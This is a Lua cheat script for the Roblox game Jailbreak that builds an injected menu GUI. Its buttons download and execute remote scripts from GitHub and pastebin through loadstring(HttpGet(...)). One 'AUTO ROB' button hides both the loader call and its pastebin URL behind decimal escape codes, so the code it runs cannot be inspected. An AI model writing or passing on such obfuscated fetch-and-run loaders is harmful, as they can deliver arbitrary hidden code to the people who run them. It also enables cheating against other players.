--by prisaman

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local duckhub = Instance.new("TextButton")
local close = Instance.new("TextButton")
local VYNIXIUS = Instance.new("TextButton")
local AUTOROB = Instance.new("TextButton")
local speedjumppower = Instance.new("TextButton")
local OPEN = Instance.new("Frame")
local OPEN2 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(85, 255, 255)
main.BorderColor3 = Color3.fromRGB(170, 0, 255)
main.Position = UDim2.new(0.250035942, 0, 0.418667734, 0)
main.Size = UDim2.new(0, 472, 0, 253)
main.Visible = false
main.Active = true
main.Draggable = true

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Size = UDim2.new(0, 472, 0, 50)
TextLabel.Font = Enum.Font.SciFi
TextLabel.Text = "jailbreak gui (by prisaman)"
TextLabel.TextColor3 = Color3.fromRGB(255, 85, 255)
TextLabel.TextSize = 14.000

duckhub.Name = "duck hub"
duckhub.Parent = main
duckhub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
duckhub.Position = UDim2.new(0.0233050846, 0, 0.229957744, 0)
duckhub.Size = UDim2.new(0, 200, 0, 50)
duckhub.Font = Enum.Font.SourceSans
duckhub.Text = "duck hub"
duckhub.TextColor3 = Color3.fromRGB(0, 0, 0)
duckhub.TextSize = 14.000
duckhub.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/NougatBitz/DuckHub/master/Main.lua'))()
end)

close.Name = "close"
close.Parent = main
close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
close.BorderColor3 = Color3.fromRGB(0, 0, 0)
close.Position = UDim2.new(0.878717303, 0, 0, 0)
close.Size = UDim2.new(0, 57, 0, 50)
close.Font = Enum.Font.PermanentMarker
close.Text = "X"
close.TextColor3 = Color3.fromRGB(170, 0, 0)
close.TextScaled = true
close.TextSize = 14.000
close.TextStrokeColor3 = Color3.fromRGB(170, 0, 0)
close.TextWrapped = true
close.MouseButton1Down:connect(function()
	main.Visible = false
	OPEN.Visible = true
end)


VYNIXIUS.Name = "VYNIXIUS"
VYNIXIUS.Parent = main
VYNIXIUS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VYNIXIUS.BorderColor3 = Color3.fromRGB(0, 0, 0)
VYNIXIUS.Position = UDim2.new(0.521186411, 0, 0.233201578, 0)
VYNIXIUS.Size = UDim2.new(0, 200, 0, 50)
VYNIXIUS.Font = Enum.Font.SourceSans
VYNIXIUS.Text = "VYNIXIUS (key: M4osAvylUb4cfgdsSVOy)"
VYNIXIUS.TextColor3 = Color3.fromRGB(0, 0, 0)
VYNIXIUS.TextSize = 14.000
VYNIXIUS.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Vynixius%20Jailbreak", true))()
end)

AUTOROB.Name = "AUTOROB"
AUTOROB.Parent = main
AUTOROB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AUTOROB.BorderColor3 = Color3.fromRGB(0, 0, 0)
AUTOROB.Position = UDim2.new(0.521186411, 0, 0.695652187, 0)
AUTOROB.Size = UDim2.new(0, 200, 0, 50)
AUTOROB.Font = Enum.Font.SourceSans
AUTOROB.Text = "AUTO ROB\\n"
AUTOROB.TextColor3 = Color3.fromRGB(0, 0, 0)
AUTOROB.TextSize = 14.000
AUTOROB.MouseButton1Down:connect(function()
	getfenv()["\108\111\97\100\115\116\114\105\110\103"](game:HttpGet("\104\116\116\112\115\58\47\47".."pastebin".."\46\99\111\109\47\114\97\119\47\102\88\84\82\53\98\106\90"))()
end)



speedjumppower.Name = "speed & jump power"
speedjumppower.Parent = main
speedjumppower.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
speedjumppower.BorderColor3 = Color3.fromRGB(0, 0, 0)
speedjumppower.Position = UDim2.new(0.0233050846, 0, 0.695652187, 0)
speedjumppower.Size = UDim2.new(0, 200, 0, 50)
speedjumppower.Font = Enum.Font.SourceSans
speedjumppower.Text = "speed & jump power"
speedjumppower.TextColor3 = Color3.fromRGB(0, 0, 0)
speedjumppower.TextSize = 14.000
speedjumppower.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/dreampoopo/scripts/main/jailbreakspeedandjump", true))()
end)

OPEN.Name = "OPEN"
OPEN.Parent = ScreenGui
OPEN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OPEN.Position = UDim2.new(0.00554667413, 0, 0.502978504, 0)
OPEN.Size = UDim2.new(0, 110, 0, 26)
main.Active = true
main.Draggable = true

OPEN2.Name = "OPEN2"
OPEN2.Parent = OPEN
OPEN2.BackgroundColor3 = Color3.fromRGB(85, 255, 255)
OPEN2.Size = UDim2.new(0, 110, 0, 26)
OPEN2.Font = Enum.Font.SciFi
OPEN2.Text = "OPEN"
OPEN2.TextColor3 = Color3.fromRGB(0, 0, 0)
OPEN2.TextSize = 14.000
OPEN2.MouseButton1Down:connect(function()
	main.Visible = true
	OPEN.Visible = false
end)
